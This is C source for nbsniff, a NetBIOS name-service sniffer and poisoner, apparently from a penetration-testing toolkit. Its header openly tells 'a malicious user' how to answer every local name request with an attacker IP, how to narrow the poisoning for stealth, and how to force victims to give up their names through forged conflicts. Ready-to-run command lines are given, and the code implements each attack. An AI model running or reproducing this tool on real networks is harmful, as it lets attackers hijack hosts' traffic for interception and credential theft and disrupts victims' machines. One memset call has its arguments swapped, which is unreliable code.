/* nbsniff.c
 * By Ron Bowes
 * Created August, 2008
 *
 * (See LICENSE.txt)
 *
 *==Intro==
 * [[nbsniff]] is designed to watch and poison NetBIOS name and registration
 * requests. This lets a malicious user take over all names on a local network
 * that aren't resolved by DNS. It can also force systems to relinquish their
 * name at boot time if it's a name that the attacker wants. 
 *
 *==Usage==
 *<pre>
 * Usage: ./nbsniff [options] <action>
 *  -h --help
 *     Help (this screen).
 *  -s --source <sourceip>
 *     The ip address to reply with when using --poison. Required for --poison.
 *  -n --name <name>
 *     The name to poison. If set, only requests containing this name will be
 *     poisoned.
 *  -p --port <port>
 *     Listen on a port instead of the default (137). Since requests are sent on
 *     UDP port 137, you likely don't want to change this.
 *  -u --username <user>
 *     Drop privileges to this user after opening socket (default: 'nobody')
 *  -w --wait <ms>
 *     The amount of time, in milliseconds, to wait for responses. Default: 500ms.
 *  -V --version
 *     Print version and exit.
 * Actions (--sniff is always active):
 *  --sniff (default)
 *     Display all NetBIOS requests received. This is the default action.
 *  --poison [address]
 *     Poison NetBIOS requests by sending a response containing the --source ip
 *     whenever a name request from the address is seen. Requires --source to be
 *     set. If address isn't given, all targets are poisoned.
 *  --conflict [address]
 *     If this is set, when a system tries to register or renew a name, a conflict
 *     is returned, forcing the system to relinquish the name. If an address is
 *     given, only registratons/renewals from the address are replied to.
 *</pre>
 *
 *==Details==
 * nbsniff listens on UDP port 137 by default. UDP/137 is used by Windows (and
 * Samba) for the NetBIOS Name Service protocol. This protocol is used to
 * resolve local names when DNS fails. For example, if you have a machine named
 * WINDOWS2000 on the local network, you can run "ping WINDOWS2000" and it'll
 * work. How? By a broadcast. The sequence of events are:
 *
 * # Windows checks the local 'hosts' file for an entry for "WINDOWS2000".
 * # Windows sends a DNS request to the default DNS server for "WINDOWS2000".
 * # Windows sends a DNS request to the default DNS server for "WINDOWS2000.<domain>".
 * # Windows broadcasts a NetBIOS name request to the local broadcast address.
 *
 * The fourth point is the key -- any box named "WINDOWS2000" that sees the
 * NetBIOS name request responds saying "I'm here!". nbsniff displays those
 * requests. Now, how can we abuse them?
 *
 * First, we have the --poison argument. --poison, by default, replies to every
 * request with the given ip address (the address is given in --source). So if
 * you run:
 *<pre>nbsniff --poison --source=1.2.3.4</pre>
 *
 * Everybody NetBIOS name request will be responded to with 1.2.3.4.
 *
 * If you want to be a little more stealthy, there are a couple extra options.
 * --name <name> can be used to respond only to requests containing a certain
 * name. So, if you want to poison only requests containing "windows", you
 * could run:
 * <pre>nbsniff --poison --source=1.2.3.4 --name=windows</pre>
 *
 * Note that it's not case sensitive.
 *
 * Further, you can restrict poisoning to be against a certain address by giving
 * the address as an argument to --poison. Any request from the address will be
 * responded to as usual. For example, if you want to only poison requests from
 * 192.168.1.100, you can do this:
 * <pre>nbsniff --poison=192.168.1.100 --source=1.2.3.4</pre>
 *
 * After that, any request from 192.168.1.100 will be poisoned.
 *
 * Now, what happens if there's actually a system on the local network named
 * WINDOWS2000? Will it still respond to our requests?
 *
 * The answer, unfortunately, is yes. If we're poisoning WINDOWS2000 with
 * 1.2.3.4 and there's already a system on the network named WINDOWS2000, they
 * will both respond:
 *<pre>
 * $ nbquery --nb=WINDOWS2000
 * Creating a UDP socket.
 * Sending query.
 * ANSWER query: (NB:WINDOWS2000    <00|workstation>): success, IP: 1.2.3.4, TTL: 0s
 * ANSWER query: (NB:WINDOWS2000    <00|workstation>): success, IP: 192.168.1.102, TTL: 300000s
 *</pre>
 *
 * In this case, the poisoned request arrived first. That won't always happen,
 * be the case, though. It really comes down to a race. If you're lucky, you'll
 * win.
 *
 * The next question is, is there a way to cheat?
 *
 * Of course there is! But, it's somewhat disruptive and causes an error message
 * on the target machine.
 *
 * The way we cheat, basically, is to tell any machines that try to claim a name
 * that the name is already taken. This is done by using a 'conflict' response,
 * --conflict. Like poison, you can pass a --name argument to poison only certain
 * names, and you can pass an address to --conflict to only respond to that host.
 *
 * Here is how you'd respond to conflicts for 192.168.1.102 attempting to register
 * WINDOWS2000, and respond with 1.2.3.4 if 192.168.1.100 tries to look it up:
 *<pre>nbsniff --poison=192.168.1.100 --conflict=192.168.1.102 --name=WINDOWS2000 --source=1.2.3.4</pre>
 *
 * Typically, though, you'll want to cast a broader net. This responds to every
 * machine with a 'conflict' and every name request with '1.2.3.4':
 *<pre>nbsniff --poison --conflict --source=1.2.3.4</pre>
 *
 * Once 'conflict' is turned on, any machine on the local network who tries
 * to claim a name will be forced to relinquish it. Machines claim names when
 * they boot, so you'll have to wait for the machine to reboot (or force it to)
 * to take over its name. Unfortunately, after receiving the conflict, the
 * target machine displays a message saying "A duplicate name exists on the
 * network."
 *
 * That's everything that nbsniff can do. Hope it helps!
 *
 * And by the way, a great way to test the various features of nbsniff is by
 * using [[nbquery]]. See its documentation for more info!
 *
 */

#define _GNU_SOURCE /* For strcasestr(). */

#include <assert.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef WIN32
#include <winsock2.h>
#else
#include <strings.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/types.h>
#endif

#include "buffer.h"
#include "dns.h"
#include "netbios_types.h"
#include "memory.h"
#include "my_getopt.h"
#include "select_group.h"
#include "types.h"
#include "udp.h"

#define NAME "nbsniff"

typedef struct
{
	char        *user; /* For dropping privileges. */

	char        *source; /* Address to send back. */

	char        *name; /* Name to poison. */

	int          socket;
	uint16_t     port; /* Will probably be 137. */
	int          wait; /* The amount of time to listen. -1 = forever. */

	char        *poison; /* Set to a target address to poison responses; set to '*' to poison all responses. */
	char        *conflict; /* Set to a target address to send conflict responses to that name; set to '*' for all. */

	/* So we can free it later. */
	select_group_t *group;
} settings_t;

settings_t *global_settings;

static void send_poison_response(settings_t *settings, int socket, char *addr, uint16_t port, char *name, uint8_t name_type, uint16_t trn_id)
{
	dns_t *response = dns_create();
	uint8_t *packet;
	uint32_t packet_length;

	fprintf(stderr, "Replying to request for '%s<%02x>' with %s\n", name, name_type, settings->source);

	response->trn_id = trn_id;
	response->flags  = FLAGS_R_RESPONSE | FLAGS_OPCODE_QUERY | FLAGS_NM_AA | FLAGS_NM_RD;

	dns_add_answer_NB(response, name, name_type, NULL, 1, 0, 0x0000, settings->source);

	packet = dns_to_packet(response, &packet_length);
	dns_destroy(response);

	udp_send(socket, addr, port, packet, packet_length);
	safe_free(packet);
}

static void send_conflict_response(settings_t *settings, int socket, char *addr, uint16_t port, char *name, uint8_t name_type, uint16_t trn_id)
{
	dns_t *response = dns_create();
	uint8_t *packet;
	uint32_t packet_length;

	fprintf(stderr, "Replying to registration request for '%s<%02x>' with a conflict (%s)\n", name, name_type, settings->source);

	response->trn_id = trn_id;
	response->flags = FLAGS_R_RESPONSE | FLAGS_OPCODE_NAME_REGISTRATION | FLAGS_NM_AA | FLAGS_NM_RD | FLAGS_NM_RA | FLAGS_RCODE_ACT_ERR;

	dns_add_answer_NB(response, name, name_type, NULL, 1, 0, 0x0000, settings->source ? settings->source : "0.0.0.0");

	packet = dns_to_packet(response, &packet_length);
	dns_destroy(response);

	udp_send(socket, addr, port, packet, packet_length);
	safe_free(packet);
}

static NBBOOL should_poison(settings_t *settings, uint16_t flags, char *name, char *addr)
{
	/* Check the flags to see if it's a query. */
	if((flags & FLAGS_OPCODE_MASK) != FLAGS_OPCODE_QUERY)
		return FALSE;

	/* See if poison is enabled. */
	if(!settings->poison)
		return FALSE;

	/* Check the name. */
	if(!(!strcmp(settings->poison, "*") || !strcmp(addr, settings->poison)))
		return FALSE;

	/* Check the address. */
	if(!(settings->name == NULL || strcasestr(name, settings->name)))
		return FALSE;

	return TRUE;
}

static NBBOOL should_conflict(settings_t *settings, uint16_t flags, char *name, char *addr)
{
	/* Check the flags to see if it's a register or refresh. */
	if(((flags & FLAGS_OPCODE_MASK) != FLAGS_OPCODE_NAME_REGISTRATION) && ((flags & FLAGS_OPCODE_MASK) != FLAGS_OPCODE_NAME_REFRESH))
		return FALSE;

	/* See if poison is enabled. */
	if(!settings->conflict)
		return FALSE;

	/* Check the name. */
	if(!(!strcmp(settings->conflict, "*") || !strcmp(addr, settings->conflict)))
		return FALSE;

	/* Check the address. */
	if(!(settings->name == NULL || strcasestr(name, settings->name)))
		return FALSE;

	return TRUE;
}

static SELECT_RESPONSE_t nb_recv_callback(void *group, int s, uint8_t *data, size_t length, char *addr, uint16_t port, void *param)
{
	settings_t *settings = (settings_t*) param;
	uint16_t i;

	dns_t *dns = dns_create_from_packet(data, length);
	printf("Received a query from %s:%d:\n", addr, port);

	for(i = 0; i < dns->question_count; i++)
	{
		if(dns->questions[i].type == DNS_TYPE_NB)
		{
			char    decoded_name[16];
			uint8_t type;

			NB_print_question(dns->questions[i], dns->flags);
			NB_decode_name(dns->questions[i].name, decoded_name, &type);

			if(should_poison(settings, dns->flags, decoded_name, addr))
				send_poison_response(settings, s, addr, port, decoded_name, type, dns->trn_id);

			if(should_conflict(settings, dns->flags, decoded_name, addr))
				send_conflict_response(settings, s, addr, port, decoded_name, type, dns->trn_id);
		}
		else if(dns->questions[i].type == DNS_TYPE_NBSTAT)
		{
			NBSTAT_print_question(dns->questions[i], dns->flags);
		}
		else
		{
			fprintf(stderr, "Unknown NetBIOS question: 0x%04x\n", dns->questions[i].type);
		}
	}
	printf("\n");

	dns_destroy(dns);

	return SELECT_OK;
}

static SELECT_RESPONSE_t nb_timeout(void *group, int socket, void *s)
{
	fprintf(stderr, "Wait time has elapsed.\n");
	exit(0);
	return SELECT_OK;
}

static void nb_poll(settings_t *settings)
{
	settings->group = select_group_create();
	select_group_add_socket(settings->group, settings->socket, SOCKET_TYPE_DATAGRAM, settings);
	select_set_recv(settings->group, settings->socket, nb_recv_callback);

	select_set_timeout(settings->group, settings->socket, nb_timeout);

	while(1)
		select_group_do_select(settings->group, settings->wait);

	select_group_destroy(settings->group);
}

#if 0
static void query_send(settings_t *settings)
{
    dns_t      *dns;
    uint8_t    *packet;
    uint32_t    packet_length;

	/* Create the DNS object. */
    dns = dns_create();
    dns->flags  = FLAGS_R_REQUEST | FLAGS_OPCODE_QUERY | FLAGS_NM_B;
	dns->trn_id = 0x1337;

	/* Add the question. */
    dns_add_netbios_question(dns, settings->name, settings->name_type, NULL, settings->query_type == TYPE_QUERY_NB ? DNS_TYPE_NB : DNS_TYPE_NBSTAT, 0x0001);

	/* Convert the DNS object to a packet. */
    packet = dns_to_packet(dns, &packet_length);
    dns_destroy(dns);

	/* Put it on the wire. */
	fprintf(stderr, "Sending query.\n");
    udp_send(settings->socket, settings->target, settings->port, packet, packet_length);
    safe_free(packet);
}

static void register_send(settings_t *settings)
{
    dns_t      *dns;
    uint8_t    *packet;
    uint32_t    packet_length;

	/* Create the DNS object. */
    dns = dns_create();
	dns->flags = FLAGS_R_REQUEST | FLAGS_NM_RD | FLAGS_NM_B;

	if(settings->query_type == TYPE_REGISTER)
	    dns->flags  = FLAGS_OPCODE_NAME_REGISTRATION;
	else if(settings->query_type == TYPE_REFRESH)
	    dns->flags  = FLAGS_OPCODE_NAME_REFRESH;
	else if(settings->query_type == TYPE_RELEASE)
	    dns->flags  = FLAGS_OPCODE_NAME_RELEASE;
	else
		fprintf(stderr, "Unknown query type made it into register_send() -- %d\n", settings->query_type);

	dns->trn_id = 0x1337;

	/* Add the question/additional. */
    dns_add_netbios_question(dns, settings->name, settings->name_type, NULL, DNS_TYPE_NB, 0x0001);
	dns_add_additional_NB(dns, settings->name, settings->name_type, NULL, 0x0001, 0, 0x0000, settings->source);

	/* Convert the DNS object to a packet. */
    packet = dns_to_packet(dns, &packet_length);
    dns_destroy(dns);

	/* Put it on the wire. */
	fprintf(stderr, "Sending query.\n");
    udp_send(settings->socket, settings->target, settings->port, packet, packet_length);
    safe_free(packet);
}
#endif

static void cleanup(void)
{
	printf("Cleaning up...\n");

	if(global_settings)
	{
		if(global_settings->group)
			select_group_destroy(global_settings->group);
		safe_free(global_settings);
	}

	/* Print allocated memory. This will only run if -DTESTMEMORY is given. */
	print_memory();
}

static void interrupt(int signal)
{
	/* Note: exiting like this will call the atexit() function, cleanup(). */
	fprintf(stderr, "punt!\n");
	exit(0);
}


static void usage(char *program, char *error)
{

	fprintf(stderr, "Usage: %s [options] <action>\n", program);
	fprintf(stderr, " -h --help\n");
	fprintf(stderr, "    Help (this screen).\n");
	fprintf(stderr, " -s --source <sourceip>\n");
	fprintf(stderr, "    The ip address to reply with when using --poison. Required for --poison.\n");
	fprintf(stderr, " -n --name <name>\n");
	fprintf(stderr, "    The name to poison. If set, only requests containing this name will be\n");
	fprintf(stderr, "    poisoned.\n");
	fprintf(stderr, " -p --port <port>\n");
	fprintf(stderr, "    Listen on a port instead of the default (137). Since requests are sent on\n");
	fprintf(stderr, "    UDP port 137, you likely don't want to change this.\n");
	fprintf(stderr, " -u --username <user>\n");
	fprintf(stderr, "    Drop privileges to this user after opening socket (default: 'nobody')\n");
	fprintf(stderr, " -w --wait <ms>\n");
	fprintf(stderr, "    The amount of time, in milliseconds, to wait for responses. Default: 500ms.\n");
	fprintf(stderr, " -V --version\n");
	fprintf(stderr, "    Print version and exit.");
	fprintf(stderr, "\n");
	fprintf(stderr, "Actions (--sniff is always active):\n");
	fprintf(stderr, " --sniff (default)\n");
	fprintf(stderr, "    Display all NetBIOS requests received. This is the default action.\n");
	fprintf(stderr, " --poison [address]\n");
	fprintf(stderr, "    Poison NetBIOS requests by sending a response containing the --source ip\n");
	fprintf(stderr, "    whenever a name request from the address is seen. Requires --source to be\n");
	fprintf(stderr, "    set. If address isn't given, all targets are poisoned.\n");
	fprintf(stderr, " --conflict [address]\n");
	fprintf(stderr, "    If this is set, when a system tries to register or renew a name, a conflict\n");
	fprintf(stderr, "    is returned, forcing the system to relinquish the name. If an address is\n");
	fprintf(stderr, "    given, only registratons/renewals from the address are replied to.\n");
	fprintf(stderr, "\n");

	if(error)
		fprintf(stderr, "ERROR: %s\n", error);
	fprintf(stderr, "\n");


	exit(1);
}

static void version()
{
	fprintf(stderr, "%s is part of %s\n", NAME, NBTOOL_NAME_VERSION);
	exit(0);
}


int main(int argc, char *argv[])
{
	settings_t *s = safe_malloc(sizeof(settings_t));
	char        c;
	int         option_index;
	const char *option_name;

	/* Build the long-options array for parsing the options. */
	struct option long_options[] =
	{
		/* General options. */
		{"help",        no_argument,       0, 0}, /* Help. */
		{"h",           no_argument,       0, 0},
		{"H",           no_argument,       0, 0},
		{"name",        required_argument, 0, 0}, /* Name. */
		{"n",           required_argument, 0, 0},
		{"port",        required_argument, 0, 0}, /* Port. */
		{"p",           required_argument, 0, 0},
		{"source",      required_argument, 0, 0}, /* Source. */
		{"s",           required_argument, 0, 0},
		{"username",    no_argument,       0, 0}, /* Username. */
		{"u",           no_argument,       0, 0},
		{"version",     no_argument,       0, 0}, /* Version. */
		{"V",           no_argument,       0, 0},
		{"wait",        required_argument, 0, 0}, /* Wait time. */
		{"w",           required_argument, 0, 0},

		/* Actions (exactly one has to be selected). */
		{"sniff",       optional_argument, 0, 1}, /* View traffic. */
		{"poison",      optional_argument, 0, 1}, /* Send poisoned responses. */
		{"conflict",    optional_argument, 0, 1}, /* Send conflict responses. */

		{0, 0, 0, 0}
	};

	/* Initialize Winsock (if we're on Windows). */
	winsock_initialize();

	/* Get ready to randomize. */
	srand((unsigned int)time(NULL));

	/* Clear the settings. */
	memset(s, sizeof(s), 0);

	/* Set some defaults. */
	s->port          = 137;
	s->source        = NULL;
	s->name          = NULL;
	s->user          = "nobody";
	s->wait          = -1;

	/* Catch SIGINT. */
	signal(SIGINT, interrupt);

	/* Catch all exit events. */
	atexit(cleanup);

	/* Parse the commandline options. */
	opterr = 0;
	while((c = getopt_long_only(argc, argv, "", long_options, &option_index)) != EOF)
	{
		switch(c)
		{
			case 0:
				option_name = long_options[option_index].name;

				/* General options. */
				if(!strcmp(option_name, "help") || !strcmp(option_name, "h") || !strcmp(option_name, "H"))
				{
					usage(argv[0], NULL);
				}
				else if(!strcmp(option_name, "name") || !strcmp(option_name, "n"))
				{
					s->name = optarg;
				}
				else if(!strcmp(option_name, "port") || !strcmp(option_name, "p"))
				{
					s->port = atoi(optarg);
				}
				else if(!strcmp(option_name, "source") || !strcmp(option_name, "s"))
				{
					s->source = optarg;
				}
				else if(!strcmp(option_name, "username") || !strcmp(option_name, "u"))
				{
					s->user = optarg;
				}
				else if(!strcmp(option_name, "version") || !strcmp(option_name, "V"))
				{
					version();
				}
				else if(!strcmp(option_name, "wait") || !strcmp(option_name, "w"))
				{
					s->wait = atoi(optarg);
				}
			break;

			case 1:
			{
				/* Set up the option name. */
				option_name = long_options[option_index].name;

				/* Set the name. It's ok if optarg is NULL. */
				if(!optarg)
					optarg = "*";

				/* Figure out which request type we're settings. */
				if(!strcmp(option_name, "poison"))
					s->poison = optarg;
				else if(!strcmp(option_name, "conflict"))
					s->conflict = optarg;
				else
					usage(argv[0], "Invalid request type.");
			}
			break;

			case '?':
			default:
				usage(argv[0], "Couldn't parse arguments");
			break;
		}
	}

	/* Sanity checking. */
	if(s->poison && !s->source)
		usage(argv[0], "--poison requires a source address to return (--source).");

	if(s->port != 137)
		fprintf(stderr, "WARNING: You probably don't want to change the port.\n");

#ifndef WIN32
	/* Check for the root user. */
	if(getuid() != 0 && s->port < 1024)
		fprintf(stderr, "WARNING: If the bind() fails, please re-run as root (privileges will be dropped as soon as the socket is created).\n");
#endif

	/* Create a socket */
	fprintf(stderr, "Creating a UDP socket.\n");
	s->socket = udp_create_socket(s->port, "0.0.0.0");

	/* Drop privileges, if they're running as root. */
	drop_privileges(s->user);

	/* Set the global settings -- this lets us clean up when a signal is caught. */
	global_settings = s;

	/* Let the user know what's going on. */
	if(s->poison)
		fprintf(stderr, "Poisoning requests containing '%s' sent from '%s'\n", s->name ? s->name : "*", s->poison);
	if(s->conflict)
		fprintf(stderr, "Sending conflicts on requests containing '%s' sent from '%s'\n", s->name ? s->name : "*", s->conflict);

	/* Poll for data. */
	nb_poll(s);

	return 0;
}

